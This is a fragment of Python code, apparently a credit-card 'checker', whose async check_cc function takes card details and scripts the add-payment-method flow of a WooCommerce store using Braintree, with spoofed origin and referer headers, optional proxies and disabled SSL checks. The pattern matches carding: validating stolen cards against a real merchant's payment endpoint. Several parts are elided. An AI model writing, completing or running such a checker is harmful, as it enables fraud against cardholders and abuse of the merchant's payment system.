...
async def check_cc(cc_details):
    ...
    try:
        async with aiohttp.ClientSession() as session:
            ...
            async with session.get('https://infinitediscsvipclub.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
            ...
            headers.update({
                'authority': 'www.infinitediscsvipclub.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
                'referer': 'https://www.infinitediscsvipclub.com/my-account/add-payment-method/'
            })
            data = [
                ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"df13031ecc3beae4918dc56dd96008a5"}'),
            ...
            async with session.post('https://www.infinitediscsvipclub.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as response:
